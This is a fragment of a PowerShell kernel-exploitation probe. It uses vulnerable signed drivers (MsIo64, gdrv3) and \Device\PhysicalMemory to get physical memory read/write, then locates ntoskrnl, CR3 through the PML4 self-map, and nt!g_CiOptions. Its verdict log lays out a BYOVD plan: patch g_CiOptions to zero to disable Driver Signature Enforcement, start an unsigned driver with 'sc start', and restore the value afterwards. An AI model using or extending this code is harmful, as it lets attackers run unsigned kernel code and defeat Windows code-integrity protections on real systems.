    try { $r1 = [P36Prov]::ScanNtoskrnl($g, $ramTop, [uint64]0x40000000, [ref]$hits) }
    catch { $r1 = ''; Log ("  X1 EXCEPTION: {0}" -f $_.Exception.Message) }
    foreach ($ln in ($hits -split "`r`n")) { if ($ln -ne '') { Log $ln } }
    if ($r1 -eq '') { Log '  X1 no validated ntoskrnl below 1 GB'; } else {
        $m = [regex]::Match($hits, 'pa=0x([0-9a-f]+) sizeOfImage=0x([0-9a-f]+).*export\[yes\]')
        if ($m.Success) {
            $ntPhys = [uint64]::Parse($m.Groups[1].Value, 'HexNumber')
            $ntSize = [uint32]::Parse($m.Groups[2].Value, 'HexNumber')
            Log ("  X1 ntoskrnl phys=0x{0:x} sizeOfImage=0x{1:x}  PASS" -f $ntPhys, $ntSize)
            $verdict.X_ntos = $true
        }
    }

    # X2 CR3 by PML4 self-reference (index 0x1ED, double-checked)
    foreach ($lim in [uint64]0x40000000, [uint64]0x100000000) {
        $notes = ''
        try { $r2 = [P36Prov]::FindPml4($g, $ramTop, $lim, [ref]$cr3, [ref]$notes) }
        catch { Log ("  X2 EXCEPTION (lim=0x{0:x}): {1}" -f $lim, $_.Exception.Message) }
        foreach ($ln in ($notes -split "`r`n")) { if ($ln -ne '') { Log $ln } }
        if ($cr3 -ne 0) { break }
    }
    if ($cr3 -eq 0) { Log '  X2 no self-mapped PML4 found  FAIL' } else {
        $self = [uint64]0
        $wok = $false
        try { $wok = [P36Prov]::Walk($g, $cr3, [uint64]0xFFFFF6FB7DBED000, [ref]$self) }
        catch { Log ("  X2 walk EXCEPTION: {0}" -f $_.Exception.Message) }
        Log ("  X2 cr3=0x{0:x}  self-test walk(PXE_BASE)=0x{1:x} present={2}" -f $cr3, $self, $wok)
        $verdict.X_cr3 = ($wok -and $self -eq $cr3)
        Log ("  X2 CR3 {'VALID' if self-consistent} = {0}" -f $verdict.X_cr3)
    }

    # X3 ntoskrnl virtual base
    if ($verdict.X_cr3 -and $ntPhys -ne 0) {
        try { $r3 = [P36Prov]::FindKernelVa($g, $cr3, $ntPhys, $ntSize, [ref]$ntVa) }
        catch { $r3 = ''; Log ("  X3 EXCEPTION: {0}" -f $_.Exception.Message) }
        if ($r3 -eq '') { Log '  X3 ntoskrnl VA not found  FAIL' }
        else { Log ("  X3 ntoskrnl VA base=0x{0:x}  PASS" -f $ntVa) }
    }

    # X4 nt!g_CiOptions (informational - no write in this probe)
    if ($ntVa -ne 0) {
        $rep = ''
        try { $n = [P36Prov]::FindCiOptions($g, $cr3, $ntVa, $ntPhys, $ntSize, [ref]$rep) }
        catch { $n = '0'; Log ("  X4 EXCEPTION: {0}" -f $_.Exception.Message) }
        foreach ($ln in ($rep -split "`r`n")) { if ($ln -ne '') { Log $ln } }
        Log ("  X4 pattern hits = {0}" -f $n)
        $ms = [regex]::Match($rep, 'targetVa=0x([0-9a-f]+) targetPa=0x([0-9a-f]+) current=0x([0-9a-f]+)\s+<==')
        if ($ms.Success) {
            $ciTargetVa = [uint64]::Parse($ms.Groups[1].Value, 'HexNumber')
            $ciValue = [uint32]::Parse($ms.Groups[3].Value, 'HexNumber')
            $verdict.X_ci = $true
            Log ("  X4 g_CiOptions targetVa=0x{0:x} current=0x{1:x2}  REGISTERED for the p37 patch" -f $ciTargetVa, $ciValue)
        } else { Log '  X4 no self-consistent hit (still usable: report lists every candidate)' }
    }
}

# ---- VERDICT ------------------------------------------------------------
Log ''
if ($script:ioSw) { try { $script:ioSw.Flush(); $script:ioSw.Close() } catch { } }
Log ("  io: issued={0} skipped_not_ram={1} lastPa=0x{2:x}" -f [P36Prov]::Issued, [P36Prov]::SkippedOutOfRam, [P36Prov]::LastIssuedPa)
Log '########## VERDICT ##########'
Log ("  W1 \\Device\\PhysicalMemory phys R/W : {0}" -f $(if ($verdict.W1_physmem) { 'PASS' } else { 'no' }))
Log ("  W2 MsIo64 map (fallback)           : {0}" -f $(if ($verdict.W2_msio) { 'PASS' } else { 'no' }))
Log ("  W3 gdrv3 map/copy                  : {0}" -f $(if ($verdict.W3_gdrv) { 'PASS (BAR/MMIO R/W)' } else { 'see above' }))
Log ("  X  ntoskrnl={0} cr3={1} cioptions={2}" -f $verdict.X_ntos, $verdict.X_cr3, $verdict.X_ci)
if ($verdict.W1_physmem -or $verdict.W2_msio) {
    Log '  *** WRITE PRIMITIVE AVAILABLE ***'
    Log '      => BYOVD path = stage nothing, keep testsigning OFF on a normal boot,'
    Log '         patch nt!g_CiOptions to 0, `sc start apexdrv` (loader does relocs,'
    Log '         imports and DriverEntry), restore g_CiOptions, then G1 gate run.'
    if ($verdict.X_cr3 -and $verdict.X_ci) { Log '      cr3 + g_CiOptions are resolved => p37 can patch immediately.' }
    else { Log '      cr3/g_CiOptions need one more pass before p37.' }
} elseif ($verdict.W3_gdrv) {
    Log '  *** MMIO WRITE PRIMITIVE (gdrv3 device-BAR window) ***'
    Log '      => coherent 4-byte R/W view at the driver-accepted BAR range'
    Log '         (0xFC000000 here, mapped at the driver-chosen VA).  Not RAM: the'
    Log '         DSE patch still needs a RAM write - open leads: MsIo G global'
    Log '         (0x3150, hardware-gated, zero on this box), or apexr.sys loader.'
} else {
    Log '  *** NO WRITE PRIMITIVE ***'
    Log '      => driver-loaded-on-a-normal-boot is unreachable until one of W1/W2 lands.'
    Log '      Next variable: MsIo64 struct shape from temp\drv\msio_1500.txt, or a'
    Log '      second provider (the box has gdrv3 + MsIo only).'
}
if ($g -ne [IntPtr]::Zero) { [P36Prov]::CloseHandle2($g) | Out-Null }
Log ("-- p36 END {0} --" -f (Get-Date -f 'dd/MM/yyyy HH:mm:ss'))
$script:L | Out-Null

